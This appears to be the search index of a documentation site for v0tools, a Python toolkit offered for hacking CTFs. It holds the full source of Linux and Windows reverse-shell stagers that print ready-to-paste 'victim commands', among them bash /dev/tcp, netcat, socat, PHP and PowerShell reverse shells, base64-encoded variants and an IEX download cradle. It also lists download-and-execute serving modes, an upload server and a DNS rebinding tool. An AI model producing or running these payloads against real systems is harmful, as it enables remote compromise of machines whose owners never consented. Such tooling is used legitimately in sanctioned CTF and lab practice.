[{"id":0,"href":"/configuration/","title":"Configuration","parent":"Home","content":"Environment Variable Config Keys V0_POWERSHELL_CONPTY  Location of Invoke-ConPtyShell.ps1\nsee: :: https://github.com/antonioCoco/ConPtyShell V0_USER  Default identifier on the victim machines Default: V0_Rando. V0_VENOM_CACHE  MSF Venom cache for autocomplete and functions Default ~/.msfvenom_cache.json\n"},{"id":1,"href":"/sys_prerequisites/","title":"System Install","parent":"Home","content":"    Arch Linux     RHEL/CentOS/Fedora     Ubuntu / Debian based OS\u0026#39;s     "},{"id":2,"href":"/commands/linrshell/","title":"linrshell.py","parent":"Commands","content":" Linux Reverse Shell stager.\n Screencast     Help  usage: linrshell.py [-h] [--interface INTERFACE] [--ipv {4,6}] [-p PORT] [--rshell RSHELL] [--list] Linux Reverse Shell stager. optional arguments: -h, --help show this help message and exit --interface INTERFACE, -i INTERFACE network interface: i.e. tun0, eth0, if undefined, an fzf prompt will appear --ipv {4,6} IP Version -p PORT, --port PORT port number, or default random port in range:1025-65535. --rshell RSHELL, -s RSHELL Reverse shell type nc,socat --list, -l List reverse shell types   Source  #!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34;Linux Reverse Shell stager.\u0026#34;\u0026#34;\u0026#34; import argparse from v0tools.lib import util from v0tools import ansi, syspkgs, cli from base64 import b64encode from pyfzf.pyfzf import FzfPrompt import os def _socat(args): \u0026#34;\u0026#34;\u0026#34;Raw TTY socat listener Runs: socat file:`tty`,raw,echo=0 tcp-listen:{args.port} \u0026#34;\u0026#34;\u0026#34; remote_commands = [ f\u0026#34;socat exec:\u0026#39;__SH__ -i\u0026#39;,pty,stderr,setsid,sigint,sane tcp:{args.address}:{args.port}\u0026#34;, ] lcmd = f\u0026#34;socat file:`tty`,raw,echo=0 tcp-listen:{args.port}\u0026#34; _print_remote(remote_commands) _print_local(lcmd) os.system(lcmd) def _nc(args): \u0026#34;\u0026#34;\u0026#34;Netcat Listener Runs: nc -nklv {args.address} {args.port}\u0026#34; \u0026#34;\u0026#34;\u0026#34; lcmd = f\u0026#34;nc -nklv {args.address} {args.port}\u0026#34; remote_commands = [ f\u0026#34;__SH__ -i \u0026gt;\u0026amp; /dev/tcp/{args.address}/{args.port} 0\u0026gt;\u0026amp;1\u0026#34;, f\u0026#34;mkfifo /tmp/{args.rstr};cat /tmp/{args.rstr}|__SH__ -i 2\u0026gt;\u0026amp;1|nc {args.address} {args.port} /tmp/{args.rstr}\u0026#34;, f\u0026#39;php -r \\\u0026#39;$sock=fsockopen(\u0026#34;{args.address}\u0026#34;,{args.port});exec(\u0026#34;__SH__ -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\\\u0026#39;\u0026#39;, ] _print_remote(remote_commands) _print_local(lcmd) os.system(lcmd) SH_MAP = { \u0026#34;nc\u0026#34;: _nc, \u0026#34;socat\u0026#34;: _socat, } cli = cli.Cli() parser = cli.parser cli.add_ipv_interface() cli.add_port() parser.add_argument( \u0026#34;--rshell\u0026#34;, \u0026#34;-s\u0026#34;, help=f\u0026#34;Reverse shell type {\u0026#39;,\u0026#39;.join(SH_MAP.keys())}\u0026#34;, type=str, ) parser.add_argument( \u0026#34;--list\u0026#34;, \u0026#34;-l\u0026#34;, help=\u0026#34;List reverse shell types\u0026#34;, action=\u0026#34;store_true\u0026#34;, default=False, ) def _print_remote(remote_commands): print(ansi.banner(\u0026#34;Victim Commands:\u0026#34;)) for sh in [\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;]: print(ansi.section(sh)) for i in remote_commands: sval = f\u0026#34;{i}\u0026#34;.replace(\u0026#34;__SH__\u0026#34;, sh) print(f\u0026#34;{sval} \u0026amp;\u0026#34;) print(f\u0026#34;echo {b64encode(sval.encode()).decode()} | base64 -d | {sh} \u0026amp;\u0026#34;) print() def _print_local(lcmd): print(ansi.banner(\u0026#34;Victim staging copy pasta:\u0026#34;)) print(util.rshell_stagetxt()) print(ansi.banner(f\u0026#34;Starting listener: {lcmd}\u0026#34;)) def main(args): \u0026#34;\u0026#34;\u0026#34;Run main function.\u0026#34;\u0026#34;\u0026#34; SH_MAP[args.rshell](args) if __name__ == \u0026#34;__main__\u0026#34;: args = cli.get_parse() syspkgs.check_installs([\u0026#34;nc\u0026#34;, \u0026#34;socat\u0026#34;]) # args = parser.parse_args([\u0026#34;-l\u0026#34;]) # args = parser.parse_args([\u0026#34;-i\u0026#34;, \u0026#34;tun0\u0026#34;, \u0026#34;-p\u0026#34;, \u0026#34;36185\u0026#34;]) if args.list: for k, func in SH_MAP.items(): print(f\u0026#34;{k}:\u0026#34;) for line in func.__doc__.split(\u0026#34;\\n\u0026#34;): print(f\u0026#34;\\t{line.strip()}\u0026#34;) raise SystemExit() args.rstr = util.randstr() args.fzf = FzfPrompt() if not args.rshell: args.rshell = args.fzf.prompt(SH_MAP.keys())[0] main(args)    "},{"id":3,"href":"/commands/winrshell/","title":"winrshell.py","parent":"Commands","content":" Windows Reverse Shell stager.\n Screencast     Help  usage: winrshell.py [-h] [-p PORT] [--interface INTERFACE] [--ipv {4,6}] [--rshell RSHELL] [--list] Windows Reverse Shell stager. optional arguments: -h, --help show this help message and exit -p PORT, --port PORT port number, or default random port in range:1025-65535. --interface INTERFACE, -i INTERFACE network interface: i.e. tun0, eth0, if undefined, an fzf prompt will appear --ipv {4,6} IP Version --rshell RSHELL, -s RSHELL Reverse shell type psh,conpty --list, -l List reverse shell types   Source  #!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34;Windows Reverse Shell stager.\u0026#34;\u0026#34;\u0026#34; import argparse from v0tools.lib import util from v0tools import ansi, net, fzfhelper, syspkgs from v0tools.lib.util import powershell_base64_encode from pyfzf.pyfzf import FzfPrompt from v0tools.servers import httpserv from v0tools import Config, cli import os import time SAVE = r\u0026#34;\u0026#34;\u0026#34; New-Object System.Net.Sockets.TCPClient(\u0026#39;__IP__\u0026#39;,__PORT__);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sendback2 = $sendback + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() \u0026#34;\u0026#34;\u0026#34; PSCMDS = r\u0026#34;\u0026#34;\u0026#34; $client = New-Object System.Net.Sockets.TCPClient(\u0026#39;__IP__\u0026#39;,__PORT__);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sendback2 = $sendback + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() \u0026#34;\u0026#34;\u0026#34; def _rawshell(args): \u0026#34;\u0026#34;\u0026#34;Raw Cons shell listener Runs: stty raw -echo; (stty size; cat) | nc -lvnp {args.port} \u0026#34;\u0026#34;\u0026#34; rows, cols = util.term_rows_cols() file = Config.V0_POWERSHELL_CONPTY() # Random port for temporary serv port = util.randport() psurl = httpserv.powershell_serv(args.address, str(port), file) pscmd = f\u0026#34;IEX({psurl}); Invoke-ConPtyShell -RemoteIp {args.address} -RemotePort {args.port} -Rows {rows} -Cols {cols}\u0026#34; remote_commands = [ f\u0026#34;powershell -nop -c {pscmd}\u0026#34;, f\u0026#34;powershell -nop -e {powershell_base64_encode(pscmd)}\u0026#34;, ] lcmd = f\u0026#34;stty raw -echo; (stty size; cat) | nc -lvnp {args.port}\u0026#34; _print_remote(remote_commands) _print_local(lcmd) # small delay to allow the above stuff to finish before the raw terminal # makes stuff look wonky time.sleep(2) os.system(lcmd) # Reset the tty os.system(\u0026#34;stty sane\u0026#34;) def _powershell(args): \u0026#34;\u0026#34;\u0026#34;Powershell reverse shell listener Runs: rlwrap socat tcp-listen:\u0026#34;{args.port}\u0026#34; STDOUT \u0026#34;\u0026#34;\u0026#34; def _repl(src, address, port): return src.strip().replace(\u0026#34;__IP__\u0026#34;, address).replace(\u0026#34;__PORT__\u0026#34;, str(port)) pscmds = [ _repl(i, args.address, args.port) for i in PSCMDS.splitlines() if i.strip() ] remote_commands = [ f\u0026#34;socat TCP4:{args.address}:{args.port} EXEC:\u0026#39;cmd.exe\u0026#39;,pipes\u0026#34;, f\u0026#34;socat TCP4:{args.address}:{args.port} EXEC:\u0026#39;powershell.exe\u0026#39;,pipes\u0026#34;, f\u0026#34;ncat.exe {args.address} {args.port} -e powershell.exe\u0026#34;, f\u0026#34;ncat.exe {args.address} {args.port} -e cmd.exe\u0026#34;, ] for i in pscmds: remote_commands.append(f\u0026#39;powershell -nop -c \u0026#34;{i}\u0026#34;\u0026#39;) remote_commands.append(f\u0026#34;powershell -nop -e {powershell_base64_encode(i)}\u0026#34;) lcmd = f\u0026#39;rlwrap socat tcp-listen:\u0026#34;{args.port}\u0026#34; STDOUT\u0026#39; _print_remote(remote_commands) _print_local(lcmd) os.system(lcmd) SH_MAP = { \u0026#34;psh\u0026#34;: _powershell, \u0026#34;conpty\u0026#34;: _rawshell, } cli = cli.Cli() cli.add_port() cli.add_ipv_interface() parser = cli.parser parser.add_argument( \u0026#34;--rshell\u0026#34;, \u0026#34;-s\u0026#34;, help=f\u0026#34;Reverse shell type {\u0026#39;,\u0026#39;.join(SH_MAP.keys())}\u0026#34;, type=str, ) parser.add_argument( \u0026#34;--list\u0026#34;, \u0026#34;-l\u0026#34;, help=\u0026#34;List reverse shell types\u0026#34;, action=\u0026#34;store_true\u0026#34;, default=False, ) def _print_remote(remote_commands): print(ansi.banner(\u0026#34;Victim Commands:\u0026#34;)) for i in remote_commands: print(f\u0026#34;{i}\\n\u0026#34;) def _print_local(lcmd): print(ansi.banner(f\u0026#34;Starting listener: {lcmd}\u0026#34;)) def main(args): \u0026#34;\u0026#34;\u0026#34;Run main function.\u0026#34;\u0026#34;\u0026#34; SH_MAP[args.rshell](args) if __name__ == \u0026#34;__main__\u0026#34;: syspkgs.check_installs([\u0026#34;nc\u0026#34;, \u0026#34;socat\u0026#34;, \u0026#34;rlwrap\u0026#34;]) args = cli.get_parse() # args = parser.parse_args([\u0026#34;-l\u0026#34;]) # args = parser.parse_args([\u0026#34;-i\u0026#34;, \u0026#34;tun0\u0026#34;, \u0026#34;-p\u0026#34;, \u0026#34;36185\u0026#34;]) # args = parser.parse_args([\u0026#34;-i\u0026#34;, \u0026#34;tun0\u0026#34;]) if args.list: for k, func in SH_MAP.items(): print(f\u0026#34;{k}:\u0026#34;) for line in func.__doc__.split(\u0026#34;\\n\u0026#34;): print(f\u0026#34;\\t{line.strip()}\u0026#34;) raise SystemExit() args.rstr = util.randstr() args.fzf = FzfPrompt() if not args.rshell: if len(SH_MAP) == 1: args.rshell = list(SH_MAP.keys())[0] else: args.rshell = args.fzf.prompt(SH_MAP.keys())[0] main(args)    "},{"id":4,"href":"/commands/v0_bash_complete_msfvenom/","title":"v0_bash_complete_msfvenom.py","parent":"Commands","content":" Sourceable Autocomplete for msfvenom flags.\n Screencast     Help  usage: v0_bash_complete_msfvenom.py [-h] Sourceable Autocomplete for msfvenom flags. optional arguments: -h, --help show this help message and exit   Source  #!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34;Sourceable Autocomplete for msfvenom flags.\u0026#34;\u0026#34;\u0026#34; from v0tools.msf import get_venom_auto_complete from v0tools.cli import Cli def main(args): \u0026#34;\u0026#34;\u0026#34;Run main function.\u0026#34;\u0026#34;\u0026#34; print(\u0026#34;##### Venom Autocomplete\u0026#34;, flush=True) print(get_venom_auto_complete(), flush=True) cli = Cli() cli.set_entrypoint(main) cli.set_required_binaries([\u0026#34;msfvenom\u0026#34;]) if __name__ == \u0026#34;__main__\u0026#34;: args = cli.get_parse() cli.run(args)    "},{"id":5,"href":"/commands/v0serv/","title":"v0serv.py","parent":"Commands","content":" HTTP Serve a directory, or serve a single isolated file.\n Screencast     Help  usage: v0serv.py [-h] [--interface INTERFACE] [--ipv {4,6}] [-p PORT] [-d {none,certutil,ps-download,ps-exec}] path HTTP Serve a directory, or serve a single isolated file. positional arguments: path Directory or file path. optional arguments: -h, --help show this help message and exit --interface INTERFACE, -i INTERFACE network interface: i.e. tun0, eth0, if undefined, an fzf prompt will appear --ipv {4,6} IP Version -p PORT, --port PORT port number, or default random port in range:1025-65535. -d {none,certutil,ps-download,ps-exec}, --display {none,certutil,ps-download,ps-exec} display type   Source  #!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34;HTTP Serve a directory, or serve a single isolated file.\u0026#34;\u0026#34;\u0026#34; from v0tools import cli from v0tools.servers import httpserv cli = cli.Cli(__doc__) cli.add_path() cli.add_ipv_interface() cli.add_port() parser = cli.parser parser.add_argument( \u0026#34;-d\u0026#34;, \u0026#34;--display\u0026#34;, help=\u0026#34;display type\u0026#34;, choices=httpserv.SERV_PREFIXES.keys(), default=\u0026#34;none\u0026#34;, type=str, ) def main(args): \u0026#34;\u0026#34;\u0026#34;Run main function.\u0026#34;\u0026#34;\u0026#34; httpserv.serve( args.address, str(args.port), args.path, args.display, ) cli.set_entrypoint(main) if __name__ == \u0026#34;__main__\u0026#34;: args = cli.get_parse() # args = cli.get_parse(\u0026#34;-i lo ./\u0026#34;) cli.run(args)    "},{"id":6,"href":"/commands/v0upload/","title":"v0upload.py","parent":"Commands","content":" HTTP server that accepts PUT requests from remotes.\n Screencast     Help  usage: v0upload.py [-h] [--interface INTERFACE] [--ipv {4,6}] [-p PORT] path HTTP server that accepts PUT requests from remotes. positional arguments: path Directory or file path. optional arguments: -h, --help show this help message and exit --interface INTERFACE, -i INTERFACE network interface: i.e. tun0, eth0, if undefined, an fzf prompt will appear --ipv {4,6} IP Version -p PORT, --port PORT port number, or default random port in range:1025-65535.   Source  #!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34;HTTP server that accepts PUT requests from remotes.\u0026#34;\u0026#34;\u0026#34; from v0tools import cli from v0tools.servers import httpserv cli = cli.Cli() cli.add_path() cli.add_ipv_interface() cli.add_port() parser = cli.parser def main(args): \u0026#34;\u0026#34;\u0026#34;Run main function.\u0026#34;\u0026#34;\u0026#34; httpserv.uploader( args.address, str(args.port), args.path, ) cli.set_entrypoint(main) if __name__ == \u0026#34;__main__\u0026#34;: args = cli.get_parse() main(args)    "},{"id":7,"href":"/sys_prerequisites/arch/","title":"Arch Linux","parent":"System Install","content":"# Python / Package Pre-reqs sudo pacman -S python-pip # Provides fzf, konsole, socat, rlwrap, ffmpeg, nc, msfvenom, msfconsole, screenkey sudo pacman -S fzf konsole socat rlwrap ffmpeg nmap metasploit screenkey # install pip package pip3 install v0tools "},{"id":8,"href":"/commands/cmd-not-found/","title":"cmd-not-found.py","parent":"Commands","content":" Print how to install packages on different operating systems\nThanks to https://command-not-found.com/ and Ƚukasz Lach https://twitter.com/lach_dev for hosting the site\n Screencast     Help  usage: cmd-not-found.py [-h] command Print how to install packages on different operating systems Thanks to https://command-not-found.com/ and Ƚukasz Lach https://twitter.com/lach_dev for hosting the site positional arguments: command command help optional arguments: -h, --help show this help message and exit   Source  #!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34; Print how to install packages on different operating systems Thanks to https://command-not-found.com/ and Ƚukasz Lach https://twitter.com/lach_dev for hosting the site \u0026#34;\u0026#34;\u0026#34; from bs4 import BeautifulSoup import requests import json from v0tools.cli import Cli cli = Cli() parser = cli.parser parser.add_argument( \u0026#34;command\u0026#34;, help=\u0026#34;command help\u0026#34;, type=str, ) def main(args): \u0026#34;\u0026#34;\u0026#34;Run main function.\u0026#34;\u0026#34;\u0026#34; # txt = pathlib.Path(\u0026#34;./test.html\u0026#34;).read_text() txt = requests.get(f\u0026#34;https://command-not-found.com/{args.command}\u0026#34;) val = BeautifulSoup(txt.content, \u0026#34;lxml\u0026#34;) vals = {} for i in val.findAll(\u0026#34;div\u0026#34;): if \u0026#34;command-install\u0026#34; not in i.attrs[\u0026#34;class\u0026#34;]: continue os = i.attrs.get(\u0026#34;data-os\u0026#34;) if not os: continue code = i.find(\u0026#34;code\u0026#34;).getText() vals[os] = code print(json.dumps(vals, indent=4, separators=(\u0026#34;,\u0026#34;, \u0026#34; : \u0026#34;))) if __name__ == \u0026#34;__main__\u0026#34;: args = cli.get_parse() # args = cli.get_parse(\u0026#34;booga\u0026#34;) cli.set_entrypoint(main) cli.run(args)    "},{"id":9,"href":"/commands/cmdrec/","title":"cmdrec.py","parent":"Commands","content":" Terminal Recorder using ffmpeg and KDE Console.\n Screencast     Help  usage: cmdrec.py [-h] [--overwrite] [--shell_geometry SHELL_GEOMETRY] [--recording_geometry RECORDING_GEOMETRY] [--scr SCR] [--noterm] [--terminal {konsole}] dest_file Terminal Recorder using ffmpeg and KDE Console. positional arguments: dest_file destination file, supported types mp4,gif,webm optional arguments: -h, --help show this help message and exit --overwrite, -y Overwrite destination file --shell_geometry SHELL_GEOMETRY, -g SHELL_GEOMETRY geometry in the following format x,y,pixel-width,pixel-height --recording_geometry RECORDING_GEOMETRY, -r RECORDING_GEOMETRY geometry in the following format for recording area x,y,pixel-width,pixel-height --scr SCR, -k SCR Screen Keys Screen --noterm, -n Do not spawn a new terminal --terminal {konsole}, -t {konsole} terminal command   Source  #!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34;Terminal Recorder using ffmpeg and KDE Console.\u0026#34;\u0026#34;\u0026#34; from v0tools.media import convert, screencast from v0tools import cli, exceptions import subprocess import time import signal import os import tempfile import shutil import pathlib TERM_COMMANDS = { # \u0026#34;xterm\u0026#34;: \u0026#34;xterm -class UXTerm -title uxterm -u8 -fa Mono -fs 18 -bg black -fg white -geometry __GEO__\u0026#34;, \u0026#34;konsole\u0026#34;: \u0026#34;konsole --nofork --geometry __GEO__\u0026#34;, } def _mp4(srcfile, destfile): \u0026#34;\u0026#34;\u0026#34;This is the default action, just move the file.\u0026#34;\u0026#34;\u0026#34; shutil.move(srcfile, destfile) def _gif(srcfile, destfile): \u0026#34;\u0026#34;\u0026#34;Convert to GIF.\u0026#34;\u0026#34;\u0026#34; out = convert.mp4_to_gif(srcfile, destfile, True) print(out) os.unlink(srcfile) def _webm(srcfile, destfile): out = convert.mp4_to_webm(srcfile, destfile, True) print(out) os.unlink(srcfile) FT_MAP = { \u0026#34;mp4\u0026#34;: _mp4, \u0026#34;gif\u0026#34;: _gif, \u0026#34;webm\u0026#34;: _webm, } cli = cli.Cli() parser = cli.parser parser.add_argument( \u0026#34;dest_file\u0026#34;, help=f\u0026#39;destination file, supported types {\u0026#34;,\u0026#34;.join(FT_MAP)}\u0026#39;, type=str, ) parser.add_argument( \u0026#34;--overwrite\u0026#34;, \u0026#34;-y\u0026#34;, help=\u0026#34;Overwrite destination file\u0026#34;, action=\u0026#34;store_true\u0026#34;, default=False, ) parser.add_argument( \u0026#34;--shell_geometry\u0026#34;, \u0026#34;-g\u0026#34;, help=\u0026#34;geometry in the following format x,y,pixel-width,pixel-height\u0026#34;, type=str, default=\u0026#34;0,0,1920,1080\u0026#34;, ) parser.add_argument( \u0026#34;--recording_geometry\u0026#34;, \u0026#34;-r\u0026#34;, help=\u0026#34;geometry in the following format for recording area x,y,pixel-width,pixel-height\u0026#34;, type=str, default=\u0026#34;0,0,1920,1080\u0026#34;, ) parser.add_argument( \u0026#34;--scr\u0026#34;, \u0026#34;-k\u0026#34;, help=\u0026#34;Screen Keys Screen\u0026#34;, type=int, default=0, ) parser.add_argument( \u0026#34;--noterm\u0026#34;, \u0026#34;-n\u0026#34;, help=\u0026#34;Do not spawn a new terminal\u0026#34;, action=\u0026#34;store_true\u0026#34;, default=False, ) parser.add_argument( \u0026#34;--terminal\u0026#34;, \u0026#34;-t\u0026#34;, help=\u0026#34;terminal command\u0026#34;, type=str, choices=TERM_COMMANDS.keys(), default=\u0026#34;konsole\u0026#34;, ) def _ffmpeg(args, tfile): win = WinProps(args) return screencast.x11_to_mp4( win.rx, win.ry, win.rwidth, win.rheight, tfile, ) class WinProps(object): \u0026#34;\u0026#34;\u0026#34;Window Properties.\u0026#34;\u0026#34;\u0026#34; def __init__(self, args): sarr = args.shell_geometry.split(\u0026#34;,\u0026#34;) rarr = args.recording_geometry.split(\u0026#34;,\u0026#34;) if len(sarr) != 4: parser.print_help() raise exceptions.InvalidCliArgument(\u0026#34;--shell_geometry\u0026#34;) if len(rarr) != 4: parser.print_help() raise exceptions.InvalidCliArgument(\u0026#34;--recording_geometry\u0026#34;) self.sx, self.sy, self.swidth, self.sheight = map(int, sarr) self.rx, self.ry, self.rwidth, self.rheight = map(int, rarr) def shell(args): xo = WinProps(args) geo = f\u0026#34;{xo.swidth}x{xo.sheight}+{xo.sx}+{xo.sy}\u0026#34; cmd = [ \u0026#34;konsole\u0026#34;, \u0026#34;--nofork\u0026#34;, \u0026#34;--geometry\u0026#34;, geo, ] return subprocess.Popen(cmd) def main(args): \u0026#34;\u0026#34;\u0026#34;Run main function.\u0026#34;\u0026#34;\u0026#34; ext = args.dest_file.rsplit(\u0026#34;.\u0026#34;, 1) if len(ext) == 1: raise exceptions.InvalidFileExtention(args.dest_file, list(FT_MAP)) if ext[1] not in FT_MAP: raise exceptions.InvalidFileExtention(args.dest_file, list(FT_MAP)) if os.path.exists(args.dest_file) and not args.overwrite: raise exceptions.FileExists(args.dest_file, \u0026#34;--overwrite not set\u0026#34;) args.func = FT_MAP[ext[1]] pdir = pathlib.Path(args.dest_file).resolve().parent if not pdir.exists(): raise exceptions.DirectoryNotExist(str(pdir)) if not args.noterm: shell_proc = shell(args) time.sleep(1) tfile = tempfile.mktemp(suffix=\u0026#34;.mp4\u0026#34;) rec_proc = _ffmpeg(args, tfile) keys_proc = screencast.screenkey(args.scr) if not args.noterm: shell_proc.communicate() rec_proc.send_signal(signal.SIGTERM) keys_proc.send_signal(signal.SIGTERM) time.sleep(1) else: try: rec_proc.communicate() except KeyboardInterrupt: pass keys_proc.send_signal(signal.SIGTERM) time.sleep(1) args.func(tfile, args.dest_file) # This needs to be set here cli.set_entrypoint(main) cli.set_required_binaries([\u0026#34;konsole\u0026#34;, \u0026#34;ffmpeg\u0026#34;, \u0026#34;screenkey\u0026#34;]) if __name__ == \u0026#34;__main__\u0026#34;: args = cli.get_parse() cli.run(args) # args = cli.get_parse(\u0026#34;--help\u0026#34;) # args = cli.get_parse(\u0026#34;foo.txt\u0026#34;)    "},{"id":10,"href":"/commands/","title":"Commands","parent":"Home","content":"    linrshell.py: Linux Reverse Shell stager.     winrshell.py: Windows Reverse Shell stager.     v0_bash_complete_msfvenom.py: Sourceable Autocomplete for msfvenom flags.     v0serv.py: HTTP Serve a directory, or serve a single isolated file.     v0upload.py: HTTP server that accepts PUT requests from remotes.     cmd-not-found.py: Print how to install packages on different operating systems Thanks to https://command-not-found.com/ and Ƚukasz Lach https://twitter.com/lach_dev for hosting the site     cmdrec.py: Terminal Recorder using ffmpeg and KDE Console.     dnsrebind.py: dns rebinding fqdn.     ip_urls.py: Generate a list of obfuscated ip variations and print to stdout.     php_search_vuln.py: Search for vulnerable calls / strings in php code. Example Repo: https://github.com/OWASP/Vulnerable-Web-Application.git     unicodes.py: print unicode values and associated information to stdout.     "},{"id":11,"href":"/commands/dnsrebind/","title":"dnsrebind.py","parent":"Commands","content":" dns rebinding fqdn.\n Screencast     Help  usage: dnsrebind.py [-h] [--test_count TEST_COUNT] [--verbose] normalip rebindip dns rebinding fqdn. positional arguments: normalip initial ip rebindip rebind ip optional arguments: -h, --help show this help message and exit --test_count TEST_COUNT, -t TEST_COUNT test count --verbose, -v verbose   Source  #!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34;dns rebinding fqdn.\u0026#34;\u0026#34;\u0026#34; from v0tools.attacks.dnsrebind import get_fqdn from v0tools.lib.log import get_log from v0tools.cli import Cli, exceptions import argparse import socket import concurrent.futures as confu import random import time from collections import Counter SECONDS = 5 MAX_TEST_COUNT = 250 MIN_TEST_COUNT = 50 LOG = get_log() cli = Cli() parser = cli.parser parser.add_argument( \u0026#34;normalip\u0026#34;, help=\u0026#34;initial ip\u0026#34;, type=str, ) parser.add_argument( \u0026#34;rebindip\u0026#34;, help=\u0026#34;rebind ip\u0026#34;, type=str, ) parser.add_argument( \u0026#34;--test_count\u0026#34;, \u0026#34;-t\u0026#34;, help=\u0026#34;test count\u0026#34;, default=0, type=int, ) parser.add_argument( \u0026#34;--verbose\u0026#34;, \u0026#34;-v\u0026#34;, action=\u0026#34;store_true\u0026#34;, help=\u0026#34;verbose\u0026#34;, default=False, ) def _q(fqdn): sl_int = random.randint(200, SECONDS * 1000) time.sleep(0.001 * sl_int) return socket.gethostbyname(fqdn) def main(args): \u0026#34;\u0026#34;\u0026#34;Run main function.\u0026#34;\u0026#34;\u0026#34; fqdn = get_fqdn(args.normalip, args.rebindip) responses = Counter() if args.test_count: if args.test_count \u0026gt;= MAX_TEST_COUNT: msg = f\u0026#34;test count should be below {MAX_TEST_COUNT}\u0026#34; raise exceptions.InvalidCliArgument(\u0026#34;--test_count\u0026#34;, msg) if args.test_count \u0026lt;= MIN_TEST_COUNT: msg = f\u0026#34;test count should be above {MIN_TEST_COUNT}\u0026#34; raise exceptions.InvalidCliArgument(\u0026#34;--test_count\u0026#34;, msg) LOG.info(f\u0026#34;Running tests on: {fqdn}\u0026#34;) LOG.info(f\u0026#34;This will finish in ~{SECONDS} seconds\u0026#34;) with confu.ThreadPoolExecutor(args.test_count) as executor: futures = [executor.submit(_q, fqdn) for _ in range(args.test_count)] for future in confu.as_completed(futures): res = future.result() responses[res] += 1 if args.verbose: LOG.info(\u0026#34;Query result: %s\u0026#34;, res) LOG.info(\u0026#34;Result Count Summary:\u0026#34;) for k, v in responses.most_common(): LOG.info(\u0026#34;%s: %s\u0026#34;, k, v) else: print(fqdn) cli.set_entrypoint(main) if __name__ == \u0026#34;__main__\u0026#34;: # args = parser.parse_args([\u0026#34;8.8.8.8\u0026#34;, \u0026#34;127.0.0.1\u0026#34;, \u0026#34;-t\u0026#34;, \u0026#34;100\u0026#34;]) args = cli.get_parse() cli.run(args)    "},{"id":12,"href":"/","title":"Home","parent":"","content":"   \n         Quickstart / Install Api Toc     This package is for those participating in hacking CTFs and want some tools to help with some of the more tedious tasks.\nEnjoy!\nPull requests welcome. :)\nQuickstart / Install  Arch Linux ...  # Python / Package Pre-reqs sudo pacman -S python-pip # Provides fzf, konsole, socat, rlwrap, ffmpeg, nc, msfvenom, msfconsole, screenkey sudo pacman -S fzf konsole socat rlwrap ffmpeg nmap metasploit screenkey # install pip package pip3 install v0tools    Ubuntu / Debian based OS\u0026#39;s ...  # Python / Package Pre-reqs sudo apt install python3-pip # Provides fzf, konsole, socat, rlwrap, ffmpeg, nc, msfvenom, msfconsole, screenkey sudo apt install fzf konsole socat rlwrap ffmpeg ncat screenkey # Install msfvenom curl https://apt.metasploit.com/metasploit-framework.gpg.key | apt-key add - echo deb http://apt.metasploit.com buster main \u0026gt;\u0026gt; /etc/apt/sources.list apt update apt install -y metasploit-framework # install pip package pip3 install v0tools    RHEL/CentOS/Fedora ...  # Python / Package Pre-reqs sudo yum -y install python3-pip python3-devel gcc git # Provides fzf, konsole, socat, rlwrap, ffmpeg, nc, msfvenom, msfconsole, screenkey sudo yum -y install konsole socat nmap-ncat screenkey # Install fzf git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf ~/.fzf/install source ~/.bashrc # Install rlwrap sudo yum -y group install \u0026#34;Development Tools\u0026#34; sudo yum -y install readline-devel git clone https://github.com/hanslub42/rlwrap.git cd rlwrap autoreconf --install ./configure make sudo make install # Install ffmpeg sudo yum -y install epel-release sudo yum -y localinstall --nogpgcheck https://download1.rpmfusion.org/free/el/rpmfusion-free-release-7.noarch.rpm sudo yum -y install ffmpeg ffmpeg-devel # Install msfvenom curl https://apt.metasploit.com/metasploit-framework.gpg.key \u0026gt; /tmp/msf.asc rpm --import /tmp/msf.asc sudo yum -y install yum-utils sudo yum-config-manager --add-repo=https://rpm.metasploit.com/ sudo yum -y install metasploit-framework.x86_64 # install pip package pip3 install v0tools    Api  API Documentation can be found here\n Toc    Configuration: Configuration Options     System Install: OS Specific Install Procedures     Arch Linux     RHEL/CentOS/Fedora     Ubuntu / Debian based OS\u0026#39;s       Commands: CLI Utilities     linrshell.py: Linux Reverse Shell stager.     winrshell.py: Windows Reverse Shell stager.     v0_bash_complete_msfvenom.py: Sourceable Autocomplete for msfvenom flags.     v0serv.py: HTTP Serve a directory, or serve a single isolated file.     v0upload.py: HTTP server that accepts PUT requests from remotes.     cmd-not-found.py: Print how to install packages on different operating systems Thanks to https://command-not-found.com/ and Ƚukasz Lach https://twitter.com/lach_dev for hosting the site     cmdrec.py: Terminal Recorder using ffmpeg and KDE Console.     dnsrebind.py: dns rebinding fqdn.     ip_urls.py: Generate a list of obfuscated ip variations and print to stdout.     php_search_vuln.py: Search for vulnerable calls / strings in php code. Example Repo: https://github.com/OWASP/Vulnerable-Web-Application.git     unicodes.py: 